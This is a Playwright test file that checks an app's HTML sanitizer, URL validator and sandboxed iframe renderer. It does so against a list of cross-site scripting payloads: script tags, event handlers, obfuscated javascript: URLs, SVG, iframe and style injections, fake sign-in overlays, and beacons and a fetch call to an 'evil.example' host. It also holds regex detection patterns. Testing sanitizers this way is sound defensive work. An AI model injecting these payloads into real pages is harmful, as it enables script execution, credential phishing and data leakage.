import { expect, test } from '@playwright/test';

// Architecture hardening — central DOM-safety layer (src/core/dom-safety.js).
// Exercises window.SutraDOMSafety in a real browser against the hostile payload
// classes the hardening spec calls out: <script>, on*= handlers, javascript:
// URLs, SVG payloads, iframe payloads, style injection, and malformed HTML.
// Asserts BOTH that the sanitized string carries no active markup AND that the
// sanitized output, once inserted, does not execute.

async function openApp(page) {
  await page.goto('/Sutra.html');
  await page.waitForFunction(() => !!window.SutraDOMSafety, null, { timeout: 20000 });
  await page.waitForFunction(() => window.__hwDueDateDelegateBound === true);
}

const HOSTILE = [
  { name: '<script> tag', payload: '<script>window.__xss=1<\/script><b>ok</b>' },
  { name: 'img onerror handler', payload: '<img src=x onerror="window.__xss=1">' },
  { name: 'svg onload payload', payload: '<svg/onload=window.__xss=1><b>ok</b>' },
  { name: 'svg nested script', payload: '<svg><script>window.__xss=1<\/script></svg>' },
  { name: 'javascript: anchor', payload: '<a href="javascript:window.__xss=1">click</a>' },
  { name: 'javascript: anchor (tab-obfuscated)', payload: '<a href="java\tscript:window.__xss=1">x</a>' },
  { name: 'entity-encoded javascript: anchor', payload: '<a href="&#106;avascript:window.__xss=1">x</a>' },
  { name: 'iframe javascript src', payload: '<iframe src="javascript:window.__xss=1"></iframe>' },
  { name: 'iframe external src', payload: '<iframe src="https://evil.example/x"></iframe>' },
  { name: 'style url(javascript:)', payload: '<div style="background:url(javascript:window.__xss=1)">x</div>' },
  { name: 'style expression()', payload: '<div style="width:expression(window.__xss=1)">x</div>' },
  { name: 'inline <style> tag', payload: '<style>*{color:red}</style><p>text</p>' },
  { name: 'body onload', payload: '<body onload="window.__xss=1">x</body>' },
  { name: 'mixed-case ScRiPt', payload: '<ScRiPt>window.__xss=1</ScRiPt>' },
  { name: 'malformed unclosed tags', payload: '<div><img src=x onerror=window.__xss=1><b>bold' },
  { name: 'srcdoc reintroduction', payload: '<iframe srcdoc="<script>window.__xss=1<\/script>"></iframe>' },
  { name: 'object/embed', payload: '<object data="javascript:window.__xss=1"></object><embed src="x">' },
  { name: 'form with formaction', payload: '<form><button formaction="javascript:window.__xss=1">go</button></form>' }
  ,{ name: 'fixed overlay', payload: '<div style="position:fixed;inset:0;z-index:2147483647;pointer-events:auto">Save failed. Sign in.</div>' }
  ,{ name: 'external image beacon', payload: '<img src="https://evil.example/pixel?secret=1" style="position:fixed;width:9999px">' }
  ,{ name: 'CSS URL beacon', payload: '<div style="background-image:url(https://evil.example/pixel)">x</div>' }
  ,{ name: 'malicious application id', payload: '<div id="settingsModal" class="modal security-warning" role="dialog">Sign in to save</div>' }
];

const FORBIDDEN = [/<script\b/i, /<svg\b/i, /<iframe\b/i, /<object\b/i, /<embed\b/i, /\son\w+\s*=/i, /javascript:/i, /vbscript:/i, /srcdoc/i, /expression\s*\(/i];

test('sanitizeUserHTML strips every hostile payload class (string level)', async ({ page }) => {
  await openApp(page);
  for (const { name, payload } of HOSTILE) {
    const out = await page.evaluate((p) => window.SutraDOMSafety.sanitizeUserHTML(p), payload);
    for (const re of FORBIDDEN) {
      expect(out, `[${name}] output should not match ${re} — got: ${out}`).not.toMatch(re);
    }
  }
});

test('sanitized output does not execute when inserted into the DOM', async ({ page }) => {
  await openApp(page);
  const fired = await page.evaluate((payloads) => {
    window.__xss = 0;
    const results = [];
    for (const p of payloads) {
      const clean = window.SutraDOMSafety.sanitizeUserHTML(p);
      const host = document.createElement('div');
      document.body.appendChild(host);
      host.innerHTML = clean; // insert sanitized markup into the live document
      results.push({ p, clean });
      host.remove();
    }
    return { xss: window.__xss, results };
  }, HOSTILE.map((h) => h.payload));
  expect(fired.xss, `XSS sentinel fired; offending: ${JSON.stringify(fired.results)}`).toBe(0);
});

test('sanitizeUserHTML preserves safe, expected markup', async ({ page }) => {
  await openApp(page);
  const out = await page.evaluate(() =>
    window.SutraDOMSafety.sanitizeUserHTML(
      '<p class="x">Hello <strong>world</strong> <a href="https://example.com" target="_blank">link</a></p>'
      + '<img src="https://example.com/a.png" alt="pic"><ul><li>one</li></ul>'
    )
  );
  expect(out).toContain('<strong>world</strong>');
  expect(out).toContain('Hello');
  expect(out).toContain('href="https://example.com"');
  expect(out).toMatch(/rel="noopener noreferrer"/); // _blank hardened
  expect(out).toContain('<li>one</li>');
  expect(out).toContain('alt="pic"');
  expect(out).not.toContain('src="https://example.com/a.png"'); // no passive image beacons
});

test('styles are property-allowlisted and user identifiers cannot collide with the app shell', async ({ page }) => {
  await openApp(page);
  const out = await page.evaluate(() => window.SutraDOMSafety.sanitizeUserHTML(
    '<div id="settingsModal" class="modal login-dialog" role="dialog" style="position:fixed;inset:0;z-index:999999;cursor:none;pointer-events:auto;color:red;padding:12px">Save failed</div>'
  ));
  expect(out).not.toMatch(/id="settingsModal"/);
  expect(out).not.toMatch(/class="modal(?:\s|\")/);
  expect(out).not.toMatch(/role="dialog"/);
  expect(out).not.toMatch(/position|z-index|cursor|pointer-events|inset/i);
  expect(out).toMatch(/color:\s*red/i);
  // Chromium may serialize the safe `padding` shorthand as four longhand
  // declarations. Assert the security contract (the allowed value survives),
  // not one browser-specific CSS serialization shape.
  expect(out).toMatch(/padding(?:\s*:|-top\s*:)\s*12px/i);
});

test('safe CSS color channels survive while oversized layout values are rejected', async ({ page }) => {
  await openApp(page);
  const out = await page.evaluate(() => window.SutraDOMSafety.sanitizeUserHTML(
    '<span style="color:rgb(255, 128, 0);width:99999px;line-height:1.6">safe color</span>'
  ));
  expect(out).toMatch(/color:\s*rgb\(255,\s*128,\s*0\)/i);
  expect(out).toMatch(/line-height:\s*1\.6/i);
  expect(out).not.toMatch(/99999/);
});

test('note tags render hostile names as inert text in the editor and sidebar', async ({ page }) => {
  await page.goto('/Sutra.html');
  await page.waitForFunction(() => !!window.flowAtelier
    && typeof window.setActiveView === 'function'
    && !!document.querySelector('#tagsContainer .add-tag-btn')
    && window.__hwDueDateDelegateBound === true);
  await page.evaluate(() => {
    window.__tagXss = 0;
    try { window.markStudentOnboardingCompleted?.(true); } catch (error) {}
    const overlay = document.getElementById('studentOnboardingOverlay');
    if (overlay) { overlay.hidden = true; overlay.classList.remove('active'); }
    window.setActiveView?.('notes');
  });
  const payload = '<img src=x onerror="window.__tagXss=1"><button onclick="window.__tagXss=2">owned</button>';
  const result = await page.evaluate((hostile) => {
    const bridge = window.flowAtelier;
    const current = bridge.getPageById(bridge.currentPageId);
    current.tags = [{ name: hostile, color: '"><img src=x onerror="window.__tagXss=3">' }];
    window.loadPage?.(current.id);
    bridge.renderPagesList();
    // Exercise the normal tag mutation path too; it refreshes the sidebar tag
    // filter from the same imported hostile value.
    window.addTag?.('safe-regression-tag');
    return {
      fired: window.__tagXss,
      editorText: document.querySelector('#tagsContainer .tag-label')?.textContent || '',
      editorColor: document.querySelector('#tagsContainer .tag')?.dataset.color || '',
      editorActiveNodes: document.querySelectorAll('#tagsContainer img, #tagsContainer .tag-label button').length,
      sidebarText: document.getElementById('sidebarTagsList')?.textContent || '',
      sidebarActiveNodes: document.querySelectorAll('#sidebarTagsList img, #sidebarTagsList .sidebar-tag button').length
    };
  }, payload);
  expect(result.fired).toBe(0);
  expect(result.editorText).toBe(payload);
  expect(result.editorColor).toBe('gray');
  expect(result.editorActiveNodes).toBe(0);
  expect(result.sidebarText).toContain(payload);
  expect(result.sidebarActiveNodes).toBe(0);
});

test('course attachment previews accept only verified passive raster/PDF bytes', async ({ page }) => {
  await page.goto('/Sutra.html');
  await page.waitForFunction(() => !!window.__sutraPublicBetaTestHooks?.validateCourseAttachmentPreview);
  const verdicts = await page.evaluate(() => {
    const validate = window.__sutraPublicBetaTestHooks.validateCourseAttachmentPreview;
    return {
      html: validate('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==', 'text/html'),
      svg: validate('data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+', 'image/svg+xml'),
      spoofedPng: validate('data:image/png;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==', 'image/png'),
      mimeMismatch: validate('data:image/png;base64,iVBORw0KGgo=', 'application/pdf'),
      png: validate('data:image/png;base64,iVBORw0KGgo=', 'image/png')
    };
  });
  expect(verdicts.html).toBeNull();
  expect(verdicts.svg).toBeNull();
  expect(verdicts.spoofedPng).toBeNull();
  expect(verdicts.mimeMismatch).toBeNull();
  expect(verdicts.png).toMatchObject({ type: 'image/png', size: 8 });
});

test('sanitizer strips application hooks, escape targets, and abusive dimensions', async ({ page }) => {
  await openApp(page);
  const out = await page.evaluate(() => window.SutraDOMSafety.sanitizeUserHTML(
    '<a href="https://example.com" target="_top" download data-sutra-action="delete">Open</a><img src="data:image/png;base64,AA==" width="999999" height="20">'
  ));
  expect(out).not.toContain('data-sutra-action');
  expect(out).not.toContain('download');
  expect(out).not.toContain('target="_top"');
  expect(out).not.toContain('999999');
  expect(out).toContain('height="20"');
});

test('setText never parses HTML; escapeHtml encodes metacharacters', async ({ page }) => {
  await openApp(page);
  const res = await page.evaluate(() => {
    const el = document.createElement('div');
    window.SutraDOMSafety.setText(el, '<img src=x onerror=alert(1)>');
    return {
      hasImg: !!el.querySelector('img'),
      text: el.textContent,
      escaped: window.SutraDOMSafety.escapeHtml('<a href="b">&\'`</a>')
    };
  });
  expect(res.hasImg).toBe(false);
  expect(res.text).toBe('<img src=x onerror=alert(1)>');
  expect(res.escaped).toBe('&lt;a href=&quot;b&quot;&gt;&amp;&#39;&#96;&lt;/a&gt;');
});

test('isSafeUrl allows benign schemes and blocks script-bearing ones', async ({ page }) => {
  await openApp(page);
  const verdicts = await page.evaluate(() => {
    const f = window.SutraDOMSafety.isSafeUrl;
    return {
      https: f('https://example.com'),
      mailto: f('mailto:a@b.com'),
      relative: f('/notes/1'),
      fragment: f('#anchor'),
      js: f('javascript:alert(1)'),
      jsTab: f('java\tscript:alert(1)'),
      jsCase: f('JavaScript:alert(1)'),
      vbscript: f('vbscript:msgbox(1)'),
      dataHtml: f('data:text/html,<script>alert(1)<\/script>'),
      dataImg: f('data:image/png;base64,iVBOR', { allowImageData: true }),
      dataSvg: f('data:image/svg+xml,<svg onload=alert(1)>', { allowImageData: true })
    };
  });
  expect(verdicts.https).toBe(true);
  expect(verdicts.mailto).toBe(true);
  expect(verdicts.relative).toBe(true);
  expect(verdicts.fragment).toBe(true);
  expect(verdicts.js).toBe(false);
  expect(verdicts.jsTab).toBe(false);
  expect(verdicts.jsCase).toBe(false);
  expect(verdicts.vbscript).toBe(false);
  expect(verdicts.dataHtml).toBe(false);
  expect(verdicts.dataImg).toBe(true);
  expect(verdicts.dataSvg).toBe(false);
});

test('renderUserHTMLToFrame isolates content in a sandboxed iframe', async ({ page }) => {
  await openApp(page);
  const res = await page.evaluate(() => {
    const host = document.createElement('div');
    const frame = window.SutraDOMSafety.renderUserHTMLToFrame(host, '<b>hi</b><script>parent.__xss=1<\/script>', { height: '120px' });
    return {
      isIframe: frame && frame.tagName === 'IFRAME',
      sandbox: frame ? frame.getAttribute('sandbox') : null,
      hasSrcdoc: !!(frame && frame.getAttribute('srcdoc')),
      hostOnlyHasFrame: host.children.length === 1 && host.firstChild === frame,
      noScriptInHost: !/<script/i.test(host.innerHTML.replace(/srcdoc="[^"]*"/i, ''))
    };
  });
  expect(res.isIframe).toBe(true);
  expect(res.sandbox).toBe(''); // passive by default: no active capabilities
  expect(res.hasSrcdoc).toBe(true);
  expect(res.hostOnlyHasFrame).toBe(true);
});

test('iframe capabilities are explicit, warned, and never grant popup escape', async ({ page }) => {
  await openApp(page);
  const res = await page.evaluate(() => {
    const unacknowledgedHost = document.createElement('div');
    const unacknowledged = window.SutraDOMSafety.renderUserHTMLToFrame(
      unacknowledgedHost,
      '<script>fetch("https://evil.example")<\/script>',
      { mode: 'interactive' }
    );
    const acknowledgedHost = document.createElement('div');
    const acknowledged = window.SutraDOMSafety.renderUserHTMLToFrame(
      acknowledgedHost,
      '<form action="https://example.com"><button>go</button></form>',
      { mode: 'interactive', capabilityAcknowledged: true }
    );
    const networkHost = document.createElement('div');
    const network = window.SutraDOMSafety.renderUserHTMLToFrame(
      networkHost,
      '<iframe src="https://open.spotify.com/embed/track/example"></iframe><iframe src="https://evil.example/widget"></iframe>',
      { mode: 'network-embeds', capabilityAcknowledged: true }
    );
    return {
      unacknowledgedSandbox: unacknowledged.getAttribute('sandbox'),
      acknowledgedSandbox: acknowledged.getAttribute('sandbox'),
      warning: acknowledgedHost.querySelector('.sutra-embed-capability-warning')?.textContent || '',
      doc: acknowledged.getAttribute('srcdoc') || '',
      networkSandbox: network.getAttribute('sandbox'),
      networkWarning: networkHost.querySelector('.sutra-embed-capability-warning')?.textContent || '',
      networkDoc: network.getAttribute('srcdoc') || ''
    };
  });
  expect(res.unacknowledgedSandbox).toBe('');
  expect(res.acknowledgedSandbox).toContain('allow-scripts');
  expect(res.acknowledgedSandbox).toContain('allow-forms');
  expect(res.acknowledgedSandbox).not.toContain('allow-popups');
  expect(res.acknowledgedSandbox).not.toContain('allow-same-origin');
  expect(res.warning).toMatch(/scripts|requests|forms/i);
  expect(res.doc).toContain("frame-src 'none'");
  expect(res.doc).toContain("navigate-to 'none'");
  expect(res.networkSandbox).toBe('allow-scripts allow-popups');
  expect(res.networkWarning).toMatch(/remote|external/i);
  expect(res.networkDoc).toContain('frame-src https://www.youtube.com');
  expect(res.networkDoc).toContain('https://open.spotify.com');
  expect(res.networkDoc).toContain("connect-src 'none'");
  expect(res.networkDoc).toContain("script-src 'unsafe-inline'");
});
